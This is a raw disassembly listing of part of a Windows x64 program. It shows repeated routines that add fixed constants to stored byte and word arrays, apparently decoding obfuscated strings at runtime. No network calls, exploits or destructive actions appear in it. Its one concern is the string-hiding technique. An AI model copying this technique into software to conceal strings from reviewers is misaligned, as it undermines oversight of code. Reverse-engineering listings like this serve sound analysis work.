   1400052bc:	66 0f 7f 15 fc e5 2b 	movdqa %xmm2,0x2be5fc(%rip)        # 0x1402c38c0
   1400052c3:	00 
   1400052c4:	66 0f 6f 15 04 e6 2b 	movdqa 0x2be604(%rip),%xmm2        # 0x1402c38d0
   1400052cb:	00 
   1400052cc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052d0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052d4:	66 0f 7f 15 f4 e5 2b 	movdqa %xmm2,0x2be5f4(%rip)        # 0x1402c38d0
   1400052db:	00 
   1400052dc:	66 0f 6f 15 fc e5 2b 	movdqa 0x2be5fc(%rip),%xmm2        # 0x1402c38e0
   1400052e3:	00 
   1400052e4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052e8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052ec:	66 0f 7f 15 ec e5 2b 	movdqa %xmm2,0x2be5ec(%rip)        # 0x1402c38e0
   1400052f3:	00 
   1400052f4:	66 0f fd 05 f4 e5 2b 	paddw  0x2be5f4(%rip),%xmm0        # 0x1402c38f0
   1400052fb:	00 
   1400052fc:	66 0f db c1          	pand   %xmm1,%xmm0
   140005300:	66 0f 7f 05 e8 e5 2b 	movdqa %xmm0,0x2be5e8(%rip)        # 0x1402c38f0
   140005307:	00 
   140005308:	8b 05 f2 e5 2b 00    	mov    0x2be5f2(%rip),%eax        # 0x1402c3900
   14000530e:	83 c0 6f             	add    $0x6f,%eax
   140005311:	0f b6 c0             	movzbl %al,%eax
   140005314:	66 89 05 e5 e5 2b 00 	mov    %ax,0x2be5e5(%rip)        # 0x1402c3900
   14000531b:	0f b7 05 e0 e5 2b 00 	movzwl 0x2be5e0(%rip),%eax        # 0x1402c3902
   140005322:	83 c0 6f             	add    $0x6f,%eax
   140005325:	0f b6 c0             	movzbl %al,%eax
   140005328:	66 89 05 d3 e5 2b 00 	mov    %ax,0x2be5d3(%rip)        # 0x1402c3902
   14000532f:	8b 05 cf e5 2b 00    	mov    0x2be5cf(%rip),%eax        # 0x1402c3904
   140005335:	83 c0 6f             	add    $0x6f,%eax
   140005338:	0f b6 c0             	movzbl %al,%eax
   14000533b:	66 89 05 c2 e5 2b 00 	mov    %ax,0x2be5c2(%rip)        # 0x1402c3904
   140005342:	c6 05 bd e5 2b 00 00 	movb   $0x0,0x2be5bd(%rip)        # 0x1402c3906
   140005349:	80 3d 36 df 2b 00 00 	cmpb   $0x0,0x2bdf36(%rip)        # 0x1402c3286
   140005350:	0f 84 cf 23 00 00    	je     0x140007725
   140005356:	80 3d c9 e5 2b 00 00 	cmpb   $0x0,0x2be5c9(%rip)        # 0x1402c3926
   14000535d:	74 5a                	je     0x1400053b9
   14000535f:	66 0f 6f 05 a9 e5 2b 	movdqa 0x2be5a9(%rip),%xmm0        # 0x1402c3910
   140005366:	00 
   140005367:	66 0f fd 05 51 65 00 	paddw  0x6551(%rip),%xmm0        # 0x14000b8c0
   14000536e:	00 
   14000536f:	66 0f db 05 a9 62 00 	pand   0x62a9(%rip),%xmm0        # 0x14000b620
   140005376:	00 
   140005377:	66 0f 7f 05 91 e5 2b 	movdqa %xmm0,0x2be591(%rip)        # 0x1402c3910
   14000537e:	00 
   14000537f:	66 0f 6f 05 99 e5 2b 	movdqa 0x2be599(%rip),%xmm0        # 0x1402c3920
   140005386:	00 
   140005387:	66 0f fd 05 51 65 00 	paddw  0x6551(%rip),%xmm0        # 0x14000b8e0
   14000538e:	00 
   14000538f:	66 0f db 05 f9 62 00 	pand   0x62f9(%rip),%xmm0        # 0x14000b690
   140005396:	00 
   140005397:	66 0f 7e 05 81 e5 2b 	movd   %xmm0,0x2be581(%rip)        # 0x1402c3920
   14000539e:	00 
   14000539f:	8b 05 7f e5 2b 00    	mov    0x2be57f(%rip),%eax        # 0x1402c3924
   1400053a5:	83 c0 6f             	add    $0x6f,%eax
   1400053a8:	0f b6 c0             	movzbl %al,%eax
   1400053ab:	66 89 05 72 e5 2b 00 	mov    %ax,0x2be572(%rip)        # 0x1402c3924
   1400053b2:	c6 05 6d e5 2b 00 00 	movb   $0x0,0x2be56d(%rip)        # 0x1402c3926
   1400053b9:	48 8d 0d d0 e4 2b 00 	lea    0x2be4d0(%rip),%rcx        # 0x1402c3890
   1400053c0:	48 8d 15 49 e5 2b 00 	lea    0x2be549(%rip),%rdx        # 0x1402c3910
   1400053c7:	e8 14 e5 ff ff       	call   0x1400038e0
   1400053cc:	80 3d b4 de 2b 00 00 	cmpb   $0x0,0x2bdeb4(%rip)        # 0x1402c3287
   1400053d3:	0f 84 9b 23 00 00    	je     0x140007774
   1400053d9:	80 3d d2 e5 2b 00 00 	cmpb   $0x0,0x2be5d2(%rip)        # 0x1402c39b2
   1400053e0:	0f 84 e6 00 00 00    	je     0x1400054cc
   1400053e6:	66 0f 6f 05 02 65 00 	movdqa 0x6502(%rip),%xmm0        # 0x14000b8f0
   1400053ed:	00 
   1400053ee:	66 0f 6f 15 3a e5 2b 	movdqa 0x2be53a(%rip),%xmm2        # 0x1402c3930
   1400053f5:	00 
   1400053f6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053fa:	66 0f 6f 0d 1e 62 00 	movdqa 0x621e(%rip),%xmm1        # 0x14000b620
   140005401:	00 
   140005402:	66 0f db d1          	pand   %xmm1,%xmm2
   140005406:	66 0f 7f 15 22 e5 2b 	movdqa %xmm2,0x2be522(%rip)        # 0x1402c3930
   14000540d:	00 
   14000540e:	66 0f 6f 15 2a e5 2b 	movdqa 0x2be52a(%rip),%xmm2        # 0x1402c3940
   140005415:	00 
   140005416:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000541a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000541e:	66 0f 7f 15 1a e5 2b 	movdqa %xmm2,0x2be51a(%rip)        # 0x1402c3940
   140005425:	00 
   140005426:	66 0f 6f 15 22 e5 2b 	movdqa 0x2be522(%rip),%xmm2        # 0x1402c3950
   14000542d:	00 
   14000542e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005432:	66 0f db d1          	pand   %xmm1,%xmm2
   140005436:	66 0f 7f 15 12 e5 2b 	movdqa %xmm2,0x2be512(%rip)        # 0x1402c3950
   14000543d:	00 
   14000543e:	66 0f 6f 15 1a e5 2b 	movdqa 0x2be51a(%rip),%xmm2        # 0x1402c3960
   140005445:	00 
   140005446:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000544a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000544e:	66 0f 7f 15 0a e5 2b 	movdqa %xmm2,0x2be50a(%rip)        # 0x1402c3960
   140005455:	00 
   140005456:	66 0f 6f 15 12 e5 2b 	movdqa 0x2be512(%rip),%xmm2        # 0x1402c3970
   14000545d:	00 
   14000545e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005462:	66 0f db d1          	pand   %xmm1,%xmm2
   140005466:	66 0f 7f 15 02 e5 2b 	movdqa %xmm2,0x2be502(%rip)        # 0x1402c3970
   14000546d:	00 
   14000546e:	66 0f 6f 15 0a e5 2b 	movdqa 0x2be50a(%rip),%xmm2        # 0x1402c3980
   140005475:	00 
   140005476:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000547a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000547e:	66 0f 7f 15 fa e4 2b 	movdqa %xmm2,0x2be4fa(%rip)        # 0x1402c3980
   140005485:	00 
   140005486:	66 0f 6f 15 02 e5 2b 	movdqa 0x2be502(%rip),%xmm2        # 0x1402c3990
   14000548d:	00 
   14000548e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005492:	66 0f db d1          	pand   %xmm1,%xmm2
   140005496:	66 0f 7f 15 f2 e4 2b 	movdqa %xmm2,0x2be4f2(%rip)        # 0x1402c3990
   14000549d:	00 
   14000549e:	66 0f fd 05 fa e4 2b 	paddw  0x2be4fa(%rip),%xmm0        # 0x1402c39a0
   1400054a5:	00 
   1400054a6:	66 0f db c1          	pand   %xmm1,%xmm0
   1400054aa:	66 0f 7f 05 ee e4 2b 	movdqa %xmm0,0x2be4ee(%rip)        # 0x1402c39a0
   1400054b1:	00 
   1400054b2:	8b 05 f8 e4 2b 00    	mov    0x2be4f8(%rip),%eax        # 0x1402c39b0
   1400054b8:	83 c0 63             	add    $0x63,%eax
   1400054bb:	0f b6 c0             	movzbl %al,%eax
   1400054be:	66 89 05 eb e4 2b 00 	mov    %ax,0x2be4eb(%rip)        # 0x1402c39b0
   1400054c5:	c6 05 e6 e4 2b 00 00 	movb   $0x0,0x2be4e6(%rip)        # 0x1402c39b2
   1400054cc:	80 3d b5 dd 2b 00 00 	cmpb   $0x0,0x2bddb5(%rip)        # 0x1402c3288
   1400054d3:	0f 84 e0 22 00 00    	je     0x1400077b9
   1400054d9:	80 3d 02 e5 2b 00 00 	cmpb   $0x0,0x2be502(%rip)        # 0x1402c39e2
   1400054e0:	74 56                	je     0x140005538
   1400054e2:	66 0f 6f 05 06 64 00 	movdqa 0x6406(%rip),%xmm0        # 0x14000b8f0
   1400054e9:	00 
   1400054ea:	66 0f 6f 0d ce e4 2b 	movdqa 0x2be4ce(%rip),%xmm1        # 0x1402c39c0
   1400054f1:	00 
   1400054f2:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400054f6:	66 0f 6f 15 22 61 00 	movdqa 0x6122(%rip),%xmm2        # 0x14000b620
   1400054fd:	00 
   1400054fe:	66 0f db ca          	pand   %xmm2,%xmm1
   140005502:	66 0f 7f 0d b6 e4 2b 	movdqa %xmm1,0x2be4b6(%rip)        # 0x1402c39c0
   140005509:	00 
   14000550a:	66 0f fd 05 be e4 2b 	paddw  0x2be4be(%rip),%xmm0        # 0x1402c39d0
   140005511:	00 
   140005512:	66 0f db c2          	pand   %xmm2,%xmm0
   140005516:	66 0f 7f 05 b2 e4 2b 	movdqa %xmm0,0x2be4b2(%rip)        # 0x1402c39d0
   14000551d:	00 
   14000551e:	8b 05 bc e4 2b 00    	mov    0x2be4bc(%rip),%eax        # 0x1402c39e0
   140005524:	83 c0 63             	add    $0x63,%eax
   140005527:	0f b6 c0             	movzbl %al,%eax
   14000552a:	66 89 05 af e4 2b 00 	mov    %ax,0x2be4af(%rip)        # 0x1402c39e0
   140005531:	c6 05 aa e4 2b 00 00 	movb   $0x0,0x2be4aa(%rip)        # 0x1402c39e2
   140005538:	48 8d 0d f1 e3 2b 00 	lea    0x2be3f1(%rip),%rcx        # 0x1402c3930
   14000553f:	48 8d 15 7a e4 2b 00 	lea    0x2be47a(%rip),%rdx        # 0x1402c39c0
   140005546:	e8 95 e3 ff ff       	call   0x1400038e0
   14000554b:	80 3d 37 dd 2b 00 00 	cmpb   $0x0,0x2bdd37(%rip)        # 0x1402c3289
   140005552:	0f 84 92 22 00 00    	je     0x1400077ea
   140005558:	80 3d 0b e5 2b 00 00 	cmpb   $0x0,0x2be50b(%rip)        # 0x1402c3a6a
   14000555f:	0f 84 1c 01 00 00    	je     0x140005681
   140005565:	66 0f 6f 05 93 63 00 	movdqa 0x6393(%rip),%xmm0        # 0x14000b900
   14000556c:	00 
   14000556d:	66 0f 6f 15 7b e4 2b 	movdqa 0x2be47b(%rip),%xmm2        # 0x1402c39f0
   140005574:	00 
   140005575:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005579:	66 0f 6f 0d 9f 60 00 	movdqa 0x609f(%rip),%xmm1        # 0x14000b620
   140005580:	00 
   140005581:	66 0f db d1          	pand   %xmm1,%xmm2
   140005585:	66 0f 7f 15 63 e4 2b 	movdqa %xmm2,0x2be463(%rip)        # 0x1402c39f0
   14000558c:	00 
   14000558d:	66 0f 6f 15 6b e4 2b 	movdqa 0x2be46b(%rip),%xmm2        # 0x1402c3a00
   140005594:	00 
   140005595:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005599:	66 0f db d1          	pand   %xmm1,%xmm2
   14000559d:	66 0f 7f 15 5b e4 2b 	movdqa %xmm2,0x2be45b(%rip)        # 0x1402c3a00
   1400055a4:	00 
   1400055a5:	66 0f 6f 15 63 e4 2b 	movdqa 0x2be463(%rip),%xmm2        # 0x1402c3a10
   1400055ac:	00 
   1400055ad:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055b1:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055b5:	66 0f 7f 15 53 e4 2b 	movdqa %xmm2,0x2be453(%rip)        # 0x1402c3a10
   1400055bc:	00 
   1400055bd:	66 0f 6f 15 5b e4 2b 	movdqa 0x2be45b(%rip),%xmm2        # 0x1402c3a20
   1400055c4:	00 
   1400055c5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055c9:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055cd:	66 0f 7f 15 4b e4 2b 	movdqa %xmm2,0x2be44b(%rip)        # 0x1402c3a20
   1400055d4:	00 
   1400055d5:	66 0f 6f 15 53 e4 2b 	movdqa 0x2be453(%rip),%xmm2        # 0x1402c3a30
   1400055dc:	00 
   1400055dd:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055e1:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055e5:	66 0f 7f 15 43 e4 2b 	movdqa %xmm2,0x2be443(%rip)        # 0x1402c3a30
   1400055ec:	00 
   1400055ed:	66 0f 6f 15 4b e4 2b 	movdqa 0x2be44b(%rip),%xmm2        # 0x1402c3a40
   1400055f4:	00 
   1400055f5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055f9:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055fd:	66 0f 7f 15 3b e4 2b 	movdqa %xmm2,0x2be43b(%rip)        # 0x1402c3a40
   140005604:	00 
   140005605:	66 0f fd 05 43 e4 2b 	paddw  0x2be443(%rip),%xmm0        # 0x1402c3a50
   14000560c:	00 
   14000560d:	66 0f db c1          	pand   %xmm1,%xmm0
   140005611:	66 0f 7f 05 37 e4 2b 	movdqa %xmm0,0x2be437(%rip)        # 0x1402c3a50
   140005618:	00 
   140005619:	8b 05 41 e4 2b 00    	mov    0x2be441(%rip),%eax        # 0x1402c3a60
   14000561f:	83 c0 3b             	add    $0x3b,%eax
   140005622:	0f b6 c0             	movzbl %al,%eax
   140005625:	66 89 05 34 e4 2b 00 	mov    %ax,0x2be434(%rip)        # 0x1402c3a60
   14000562c:	0f b7 05 2f e4 2b 00 	movzwl 0x2be42f(%rip),%eax        # 0x1402c3a62
   140005633:	83 c0 3b             	add    $0x3b,%eax
   140005636:	0f b6 c0             	movzbl %al,%eax
   140005639:	66 89 05 22 e4 2b 00 	mov    %ax,0x2be422(%rip)        # 0x1402c3a62
   140005640:	8b 05 1e e4 2b 00    	mov    0x2be41e(%rip),%eax        # 0x1402c3a64
   140005646:	83 c0 3b             	add    $0x3b,%eax
   140005649:	0f b6 c0             	movzbl %al,%eax
   14000564c:	66 89 05 11 e4 2b 00 	mov    %ax,0x2be411(%rip)        # 0x1402c3a64
   140005653:	0f b7 05 0c e4 2b 00 	movzwl 0x2be40c(%rip),%eax        # 0x1402c3a66
   14000565a:	83 c0 3b             	add    $0x3b,%eax
   14000565d:	0f b6 c0             	movzbl %al,%eax
   140005660:	66 89 05 ff e3 2b 00 	mov    %ax,0x2be3ff(%rip)        # 0x1402c3a66
   140005667:	8b 05 fb e3 2b 00    	mov    0x2be3fb(%rip),%eax        # 0x1402c3a68
   14000566d:	83 c0 3b             	add    $0x3b,%eax
   140005670:	0f b6 c0             	movzbl %al,%eax
   140005673:	66 89 05 ee e3 2b 00 	mov    %ax,0x2be3ee(%rip)        # 0x1402c3a68
   14000567a:	c6 05 e9 e3 2b 00 00 	movb   $0x0,0x2be3e9(%rip)        # 0x1402c3a6a
   140005681:	80 3d 02 dc 2b 00 00 	cmpb   $0x0,0x2bdc02(%rip)        # 0x1402c328a
   140005688:	0f 84 fa 21 00 00    	je     0x140007888
   14000568e:	80 3d f5 e3 2b 00 00 	cmpb   $0x0,0x2be3f5(%rip)        # 0x1402c3a8a
   140005695:	74 5a                	je     0x1400056f1
   140005697:	66 0f 6f 05 d1 e3 2b 	movdqa 0x2be3d1(%rip),%xmm0        # 0x1402c3a70
   14000569e:	00 
   14000569f:	66 0f fd 05 59 62 00 	paddw  0x6259(%rip),%xmm0        # 0x14000b900
   1400056a6:	00 
   1400056a7:	66 0f db 05 71 5f 00 	pand   0x5f71(%rip),%xmm0        # 0x14000b620
   1400056ae:	00 
   1400056af:	66 0f 7f 05 b9 e3 2b 	movdqa %xmm0,0x2be3b9(%rip)        # 0x1402c3a70
   1400056b6:	00 
